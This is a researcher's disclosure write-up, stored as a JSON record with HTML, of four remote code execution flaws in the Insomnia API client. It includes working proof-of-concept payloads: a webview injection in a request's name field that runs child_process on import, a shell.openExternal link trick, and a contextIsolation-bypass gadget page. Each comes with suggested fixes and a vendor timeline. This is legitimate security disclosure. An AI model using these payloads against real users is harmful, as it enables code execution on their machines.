{"id":"2020-12-30-rce-vulnerabilities-in-insomnia-discovered","title":"RCE Vulnerabilities in Insomnia Discovered","year":"2020","created":"2020-12-30","html":"<h1 id=\"rce-vulnerabilities-in-insomnia-discovered\">RCE Vulnerabilities in Insomnia Discovered</h1>\n<p>I took a look at <a href=\"https://insomnia.rest/\">Insomnia</a> after it was recommended to me as an alternative to Postman.\nIt is a tool for API, web application and web service development and testing.\nSince it looked like an <a href=\"https://www.electronjs.org/\">Electron</a> application and I found critical vulnerabilities in other applications using this framework in the past, I was interested in checking their security.</p>\n<p>I found four different ways a malicious actor could achieve code execution on a victims computer.\nIn general the way of exploitation would be:</p>\n<ul>\n<li>A malicious project file is created.</li>\n<li>Victim opens the file in Insomnia.</li>\n</ul>\n<p>This follows the common use case of two (or more) co-workers share some project files and import a request collection in Insomnia.</p>\n<p>The first vulnerability allows code execution directly after importing.\nThe other three require additional user interaction like clicking somewhere.</p>\n<p>All were initially tested with:</p>\n<ul>\n<li>Insomnia Core 2020.5.1</li>\n<li>Insomnia 2021.1.1</li>\n</ul>\n<p>OS: Windows 10</p>\n<h2 id=\"rce-through-missing-sanitization--encoding-upon-project-import\">RCE through missing sanitization / encoding upon project import</h2>\n<h3 id=\"summary\">Summary</h3>\n<p>Missing sanitization of the name-property of requests in request collection files allow remote code execution because of insecure evaluation of markup.\nWhen a victim imports a malicious project file arbitrary code can be executed in the context of the current user.</p>\n<h3 id=\"description\">Description</h3>\n<p>The name field of a request will be inserted in the HTML code of the application without proper encoding when a description exists (see the &quot;Docs&quot;-tab).</p>\n<p>The name of a request will be taken as the heading for the markdown description of a request.\nIn <code>markdown-preview.js</code> <a href=\"https://github.com/Kong/insomnia/blob/7bc219422efe14054723c70d097ec53410db989c/packages/insomnia-app/app/ui/components/markdown-preview.js#L98\">line 98</a> the heading will be inserted in a HTML-string together with the sanitized rendered markdown.\nLater this string will be passed to <code>dangerouslySetInnerHTML</code> (React) in <a href=\"https://github.com/Kong/insomnia/blob/7bc219422efe14054723c70d097ec53410db989c/packages/insomnia-app/app/ui/components/markdown-preview.js#L105\">line 105</a> bypassing the encoding done by React.</p>\n<p>When the request name field in Insomnia is set to <code>http://legitrequest&lt;img/src=x&gt;</code> we can notice that the image gets rendered (as error image because of the invalid URL) in the &quot;Docs&quot;-tab of the request.\nFurthermore we can see the HTTP request for &quot;x&quot; in the devtools.</p>\n<p>Because there is a CSP via meta tag in use:</p>\n<pre><code>default-src * insomnia://*; img-src blob: data: * insomnia://*; script-src &#39;self&#39; &#39;unsafe-eval&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; media-src blob: data: mediastream: * insomnia://*;</code></pre>\n<p>... some further steps are necessary in order to achieve JavaScript execution in a context with node.js access.\nWe can not simply use some basic XSS payload because of the CSP and we can not simply use the alternative to redirect the main application page to a page under our control because of a <code>will-navigate</code>-handler in <a href=\"https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L107\">packages/insomnia-app/app/main/window-utils.js</a>.\nHowever, since we can inject in a top level <code>BrowserWindow</code> context which allows the <code>&lt;webview&gt;</code>-tag we can just use that and enable <code>nodeIntegration</code> on it.\nNote: The <code>&lt;webview&gt;</code>-tag is furthermore not restricted by the CSP of an embedding page. </p>\n<p>We can achieve code execution by setting the name field of the request to something like this:</p>\n<pre><code class=\"language-html\">http://legitrequest&lt;img/src=x&gt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">webview</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;data:text/html,&lt;script&gt;window.onload = ()=&gt; {document.body.innerText = JSON.stringify(process.env);require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;);}&lt;/script&gt;&quot;</span> <span class=\"hljs-attr\">webpreferences</span>=<span class=\"hljs-string\">&quot;allowRunningInsecureContent, javascript=yes&quot;</span> <span class=\"hljs-attr\">nodeintegration</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">webview</span>&gt;</span></code></pre>\n<p>This can be abused by an external attacker by creating a request that:</p>\n<ul>\n<li>contains the malicious payload (i.e. malware download or data exfiltration code) in the <em>name field</em></li>\n<li>setting a description (content does not matter, this field just needs to be set and not be empty)</li>\n<li>exporting the project file and tricking a victim into opening it\nWhen the project file is imported in Insomnia the payload will get executed automatically.\nSimilarly the malicious project file could just be hosted somewhere and an URL pointing to the file could be selected by the victim in Insomnia via import &quot;From URL&quot;. </li>\n</ul>\n<h3 id=\"steps-to-reproduce\">Steps to Reproduce</h3>\n<ol>\n<li>Open the proof of concept file in Insomnia: <a href=\"/posts/2020-12-30-rce-vulnerabilities-in-insomnia-discovered/insomnia-poc.json\">PoC</a></li>\n</ol>\n<p>Alternative (manual):</p>\n<ol>\n<li><p>Create a new Request.</p>\n</li>\n<li><p>Set the name of a request to <code>&lt;webview src=&quot;data:text/html,&lt;script&gt;window.onload = ()=&gt; {document.body.innerText = JSON.stringify(process.env);require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;);}&lt;/script&gt;&quot; webpreferences=&quot;allowRunningInsecureContent, javascript=yes&quot; nodeintegration&gt;&lt;/webview&gt;</code>.</p>\n</li>\n<li><p>In the Docs Tab click on &quot;Add Description&quot; and insert at least a single letter there. This will ensure that a description exists.</p>\n</li>\n<li><p>Export the request (Insomnia v4 JSON other formats should work as well).</p>\n</li>\n<li><p>Import the previously exported JSON file in a clean Insomnia instance (e.g. delete the previously created request before importing). </p>\n</li>\n</ol>\n<p>The payload will be automatically executed as soon as a project file containing this payload is imported.\nNo user interaction is required.\nNote: If you have already other requests and selected a specific request before importing, you need to select the imported one to trigger the payload.</p>\n<p><figure>\n\t\t\t\t<video controls=\"true\" >\n\t\t\t\t\t<source src=\"/posts/2020-12-30-rce-vulnerabilities-in-insomnia-discovered/rce-import-request-collection-json.mp4\" type=\"video/mp4\">\n\t\t\t\t</video>\n\t\t\t\t<figcaption>Video: PoC - RCE missing sanitization</figcaption>\n\t\t\t</figure></p>\n<h3 id=\"suggested-solution\">Suggested Solution</h3>\n<p>The name field of requests should be escaped or sanitized in order to prevent the initial XSS vulnerability by not allowing HTML/JavaScript code injection.\nFurthermore other areas where <code>dangerouslySetInnerHTML</code> is used, should be reviewed if they are susceptible for this type of attack.</p>\n<hr>\n<h2 id=\"rce-through-insecure-use-of-shellopenexternal\">RCE through insecure use of <code>shell.openExternal()</code></h2>\n<h3 id=\"summary-1\">Summary</h3>\n<p>Link handlers of Insomnia lack validation, which allows attackers to execute arbitrary remote executables or binaries on the local system, when a victim clicks on a malicious link.</p>\n<h3 id=\"description-1\">Description</h3>\n<p>There are multiple locations where an attacker could provide malicious links.\nFor example the description field of requests (which were imported through a request collection file) or simply in the response view of an HTTP request.\nThey are then handled by the <code>shell.openExternal()</code> function in various places:</p>\n<pre><code>packages/insomnia-app/app/main/window-utils.js\npackages/insomnia-app/app/ui/components/viewers/response-timeline-viewer.js\npackages/insomnia-app/app/common/misc.js\npackages/insomnia-app/app/ui/components/viewers/response-viewer.js</code></pre>\n<p>In each of them, an unvalidated URL is passed as argument.\nAn attacker could provide dangerous URLs, rendered as link.\nWhen a user clicks on such a link, the attacker could achieve remote code execution.\nIn a simple example an attacker will provide a link to a <code>.exe</code>-file hosted on an SMB server under his/her control.\nOne possible location for malicious links would be the description field of requests which could be provided through a project file or in HTTP-responses to certain requests.</p>\n<p>This does not only affect Windows, similar attacks are possible on other operating systems too.\nA detailed description of various possible attack vectors for different OS can be found here: <a href=\"https://benjamin-altpeter.de/shell-openexternal-dangers/\">https://benjamin-altpeter.de/shell-openexternal-dangers/</a></p>\n<h3 id=\"steps-to-reproduce-1\">Steps to Reproduce</h3>\n<ol>\n<li><p>In the description field of a request under the &quot;Docs&quot; tab add the following markdown code:\n<code>[file](file:///C:/windows/system32/calc.exe)</code></p>\n</li>\n<li><p>Click on the link in the rendered documentation (&quot;Docs&quot; tab).\nThe calculator application should be spawned.</p>\n</li>\n</ol>\n<p>Note: This just shows the execution of a local file, however there are several possibilities for executing remote files, see: <a href=\"https://benjamin-altpeter.de/shell-openexternal-dangers/\">https://benjamin-altpeter.de/shell-openexternal-dangers/</a></p>\n<p>For a video see the next vulnerability.</p>\n<h3 id=\"suggested-solution-1\">Suggested Solution</h3>\n<p>Before passing any URLs to <code>shell.openExternal()</code> the protocol should be validated and only safe URLs should be passed to the function. For example only http(s)-Links could be forwarded.</p>\n<p>See: <a href=\"https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content\">https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content</a></p>\n<hr>\n<h2 id=\"rce-through-unhandled-middle-mouse-clicks-and-malicious-links\">RCE through unhandled middle mouse clicks and malicious links</h2>\n<h3 id=\"summary-2\">Summary</h3>\n<p>Insomnia does not handle clicks with middle mouse button so the default Electron behavior is used.\nWhen a victim clicks a malicious link with the middle mouse button the application will open an Electron <code>BrowserWindow</code> which has <code>nodeIntegration</code> turned on, allowing the execution of arbitrary code.</p>\n<h3 id=\"description-2\">Description</h3>\n<p>In electron, clicks with the middle mouse button (mouse wheel) generate a separate event and can&#39;t be handled by registering an event handler for the <code>click</code> event.\nSuch a click will bypass the existing <code>click</code>-event handlers and by default will open a new electron <code>BrowserWindow</code>.\nIn the case of Insomnia we have access to the Node.js APIs in this new window through which we can execute arbitrary code.</p>\n<h3 id=\"steps-to-reproduce-2\">Steps to Reproduce</h3>\n<ol>\n<li><p>Create a html file with the following contents and host it somewhere:</p>\n<pre><code class=\"language-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n<span class=\"hljs-built_in\">window</span>.onload = <span class=\"hljs-function\">()=&gt;</span> {\n<span class=\"hljs-built_in\">document</span>.body.innerText = <span class=\"hljs-built_in\">JSON</span>.stringify(process.env);\n<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;child_process&#x27;</span>).execSync(<span class=\"hljs-string\">&#x27;calc.exe&#x27;</span>);\n}\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\ntest.html\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span></code></pre>\n</li>\n<li><p>Create a link to the file in the description of the &quot;Docs&quot; tab of a request.\nIn this example the file was hosted at <code>http://localhost:8080/test.html</code>.</p>\n</li>\n<li><p>Click with the mouse wheel / middle mouse button on the link.\nA new window will open and will show the contents of <code>process.env</code>.\nAdditionally the calculator will be spawned (on Windows).\nArbitrary node.js code can be executed.</p>\n</li>\n</ol>\n<p><figure>\n\t\t\t\t<video controls=\"true\" >\n\t\t\t\t\t<source src=\"/posts/2020-12-30-rce-vulnerabilities-in-insomnia-discovered/rce-insecure-click-handling.mp4\" type=\"video/mp4\">\n\t\t\t\t</video>\n\t\t\t\t<figcaption>Video: PoC - insecure click handling</figcaption>\n\t\t\t</figure></p>\n<h3 id=\"suggested-solution-2\">Suggested Solution</h3>\n<p>An event listener for the middle mouse button click event should be registered and the default action should be prevented.\nFurthermore the creation of new windows should be validated: <a href=\"https://www.electronjs.org/docs/tutorial/security#13-disable-or-limit-creation-of-new-windows\">https://www.electronjs.org/docs/tutorial/security#13-disable-or-limit-creation-of-new-windows</a></p>\n<hr>\n<h2 id=\"rce-through-missing-contextisolation\">RCE through missing contextIsolation</h2>\n<h3 id=\"summary-3\">Summary</h3>\n<p>The webview for previewing and rendering HTTP-responses does not have <a href=\"https://www.electronjs.org/docs/tutorial/context-isolation\">contextIsolation</a> enabled. This allows remote attackers to execute arbitrary code if a user requests a malicious website or an attacker can perform a MitM-attack and alter the HTTP response.</p>\n<h3 id=\"description-3\">Description</h3>\n<p>By default the application allows the execution of JavaScript in HTML previews of HTTP-responses.\nThere is an option where a user can disable this behavior, but by default JavaScript is allowed.</p>\n<p>When a HTML-like response for a request is received, a <code>ResponseWebview</code> element will be created: <a href=\"https://github.com/Kong/insomnia/blob/a36e22c294d22174f1a7ac03ed21f6204b192891/packages/insomnia-app/app/ui/components/viewers/response-viewer.js#L318\">response-viewer.js#L318</a>\nThis is basically a wrapper around the Electron <code>&lt;webview&gt;</code>-tag (see <a href=\"https://github.com/Kong/insomnia/blob/a36e22c294d22174f1a7ac03ed21f6204b192891/packages/insomnia-app/app/ui/components/viewers/response-web-view.js\">response-web-view.js</a> ) that loads the response converted to a data-URL.\nIn the <code>&lt;webview&gt;</code> only the option, whether JavaScript is enabled or not is set (<code>webpreferences=&quot;javascript=yes&quot;</code>), the other options are inherited of the main window, where the following options are set: </p>\n<pre><code class=\"language-js\">webPreferences: {\n    <span class=\"hljs-attr\">zoomFactor</span>: zoomFactor,\n    <span class=\"hljs-attr\">nodeIntegration</span>: <span class=\"hljs-literal\">true</span>,\n    <span class=\"hljs-attr\">webviewTag</span>: <span class=\"hljs-literal\">true</span>,\n    <span class=\"hljs-attr\">enableRemoteModule</span>: <span class=\"hljs-literal\">true</span>,\n},</code></pre>\n<p><a href=\"https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L66\">window-utils.js#L66</a></p>\n<p>The version of Electron that Insomnia uses is <code>9.1.1</code> as can be seen by navigating to &quot;Help&quot; &gt; &quot;About&quot; in the application menu.\nThe default value of <code>contextIsolation</code> in this Electron version is <code>false</code>.</p>\n<p>Missing <code>contextIsolation</code> allows an attacker to get access to Electron or Node.js APIs by overwriting JavaScript functions which might be later called in a context which has access to Node.js APIs.\nBy overwriting standard JavaScript functions like <code>Function.prototype.call</code>, the website which is loaded in the <code>&lt;webview&gt;</code> without access to Node.js APIs can get access to them when the overwritten function is executed in the context of Electron or application specific (in this case Insomnia) code.\nFor example when the overriden function is used in the application code and called with an object as argument that has access to the Nodes.js <code>child_process</code> module, it can be accessed inside the function provided as a replacement.\nSee this <a href=\"https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en\">link</a> for the original details about exploiting missing <code>contextIsolation</code>.</p>\n<p>So when a malicious website provides the following content for example:</p>\n<pre><code class=\"language-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n<span class=\"hljs-keyword\">const</span> handler = {\n  <span class=\"hljs-attr\">apply</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">target, thisArg, argumentsList</span>) </span>{\n    <span class=\"hljs-built_in\">console</span>.log(target, thisArg, argumentsList);\n    <span class=\"hljs-keyword\">if</span> (argumentsList.length === <span class=\"hljs-number\">4</span> &amp;&amp; argumentsList[<span class=\"hljs-number\">3</span>].name === <span class=\"hljs-string\">&quot;__webpack_require__&quot;</span>) {\n        argumentsList[<span class=\"hljs-number\">3</span>].m.module(<span class=\"hljs-built_in\">Array</span>.prototype)\n        <span class=\"hljs-built_in\">Array</span>.prototype.exports.createRequire(<span class=\"hljs-string\">&quot;/&quot;</span>)(<span class=\"hljs-string\">&quot;child_process&quot;</span>).spawnSync(<span class=\"hljs-string\">&quot;calc.exe&quot;</span>)\n    }\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">Reflect</span>.apply(target, thisArg, argumentsList);\n  }\n};\n<span class=\"hljs-built_in\">Function</span>.prototype.call = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Proxy</span>(<span class=\"hljs-built_in\">Function</span>.prototype.call, handler);\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">textarea</span> <span class=\"hljs-attr\">contenteditable</span> <span class=\"hljs-attr\">spellcheck</span>=<span class=\"hljs-string\">&quot;true&quot;</span>&gt;</span>\nclck and correkt mee\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">textarea</span>&gt;</span>\ntest.html\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span></code></pre>\n<p>And a user sends a request to the website, then the user right clicks on the misspelled word and clicks on a suggestion, the attackers payload will get executed.</p>\n<p>In this case a npm package called &quot;electron-context-menu&quot;, is utilized.\nIt is created in the <a href=\"https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L501\">main window</a> and also affects subwindows like the webview.\nIt simply adds a context menu with a few default features.\nOne of those is responsible for correcting misspelled words by right clicking on the word and choosing one of the suggested corrections.</p>\n<p>Practically this needs many steps from a potential victim and can be considered a more theretical example.\nHowever, this is just one possible execution chain, there might be further &quot;gadgets&quot; which would allow code execution even without any user interaction at all.</p>\n<h3 id=\"steps-to-reproduce-3\">Steps to Reproduce</h3>\n<ol>\n<li><p>Start a local webserver which serves the following HTML-file:</p>\n<pre><code class=\"language-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n<span class=\"hljs-keyword\">const</span> handler = {\n<span class=\"hljs-attr\">apply</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">target, thisArg, argumentsList</span>) </span>{\n <span class=\"hljs-built_in\">console</span>.log(target, thisArg, argumentsList);\n <span class=\"hljs-keyword\">if</span> (argumentsList.length === <span class=\"hljs-number\">4</span> &amp;&amp; argumentsList[<span class=\"hljs-number\">3</span>].name === <span class=\"hljs-string\">&quot;__webpack_require__&quot;</span>) {\n     argumentsList[<span class=\"hljs-number\">3</span>].m.module(<span class=\"hljs-built_in\">Array</span>.prototype)\n     <span class=\"hljs-built_in\">Array</span>.prototype.exports.createRequire(<span class=\"hljs-string\">&quot;/&quot;</span>)(<span class=\"hljs-string\">&quot;child_process&quot;</span>).spawnSync(<span class=\"hljs-string\">&quot;calc.exe&quot;</span>)\n }\n <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">Reflect</span>.apply(target, thisArg, argumentsList);\n}\n};\n<span class=\"hljs-built_in\">Function</span>.prototype.call = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Proxy</span>(<span class=\"hljs-built_in\">Function</span>.prototype.call, handler);\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">textarea</span> <span class=\"hljs-attr\">contenteditable</span> <span class=\"hljs-attr\">spellcheck</span>=<span class=\"hljs-string\">&quot;true&quot;</span>&gt;</span>\nclck and correkt mee\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">textarea</span>&gt;</span>\ntest.html\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span></code></pre>\n</li>\n<li><p>In Insomnia create a new request targeting the URL where the file from step 1 is located.</p>\n</li>\n<li><p>Send the request.</p>\n</li>\n<li><p>Right click on a misspelled word in the textarea and then click on one of the suggested words in the contextmenu.</p>\n</li>\n</ol>\n<p><figure>\n\t\t\t\t<video controls=\"true\" >\n\t\t\t\t\t<source src=\"/posts/2020-12-30-rce-vulnerabilities-in-insomnia-discovered/rce-missing-contextisolation.mp4\" type=\"video/mp4\">\n\t\t\t\t</video>\n\t\t\t\t<figcaption>Video: PoC - missing contextIsolation</figcaption>\n\t\t\t</figure></p>\n<h3 id=\"suggested-solution-3\">Suggested Solution</h3>\n<p>The option <code>contextIsolation</code> should be set to <code>true</code>, especially in the webview for rendering HTML previews of HTTP-responses.\nSee: <a href=\"https://www.electronjs.org/docs/tutorial/security#3-enable-context-isolation-for-remote-content\">https://www.electronjs.org/docs/tutorial/security#3-enable-context-isolation-for-remote-content</a></p>\n<hr>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Several vulnerabilities which an attacker could abuse to achieve code execution were identified and disclosed privately to the vendor.\nHowever, they were not taken seriously at first, which was quite disappointing.\nMultiple requests were made and a lot of time passed until the vulnerabilities got fixed as you can see in the timeline below.\nIn the end at least they attributed the findings in the changelog to me.</p>\n<p>Note: I did not test the fixes...</p>\n<p>Timeline:</p>\n<ul>\n<li>07.12.2020 Contacted <a href=\"mailto:&#115;&#117;&#112;&#x70;&#111;&#x72;&#116;&#64;&#105;&#x6e;&#x73;&#111;&#x6d;&#110;&#105;&#97;&#x2e;&#114;&#x65;&#115;&#116;\">&#115;&#117;&#112;&#x70;&#111;&#x72;&#116;&#64;&#105;&#x6e;&#x73;&#111;&#x6d;&#110;&#105;&#97;&#x2e;&#114;&#x65;&#115;&#116;</a></li>\n<li>07.12.2020 Vulnerability details sent</li>\n<li>14.12.2020 requesting update - response: &quot;... raised on internal tracker and should get fixed shortly.&quot;</li>\n<li>03.03.2021 Version 2021.1.0 released without security fixes</li>\n<li>10.03.2021 Version 2021.1.1 released without security fixes</li>\n<li>23.03.2021 Asking why vulnerabilities are still not fixed, sending updated information and 4th vulnerability description - response: &quot;... should post issues on Github ...&quot;</li>\n<li>23.03.2021 Explaining the dangers of publicly posting them - response: &quot;... raised them in our internal tracker again and are being prioritized ...&quot;</li>\n<li>29.06.2021 Version 2021.4.0 released with one fix (<a href=\"https://insomnia.rest/changelog#2021.4.0\">https://insomnia.rest/changelog#2021.4.0</a>)</li>\n<li>12.07.2021 Requesting status update</li>\n<li>25.08.2021 Version 2021.5.0 released with two more fixes according to changelog (<a href=\"https://insomnia.rest/changelog#2021.5.0\">https://insomnia.rest/changelog#2021.5.0</a>)</li>\n</ul>\n<hr>\n<p>Changelog:</p>\n<ul>\n<li>30.12.2020 Initial writeup of the first 3 vulnerabilities</li>\n<li>22.03.2021 Added <code>contextIsolation</code> vulnerability</li>\n<li>03.01.2022 published post</li>\n</ul>\n","lastUpdate":""}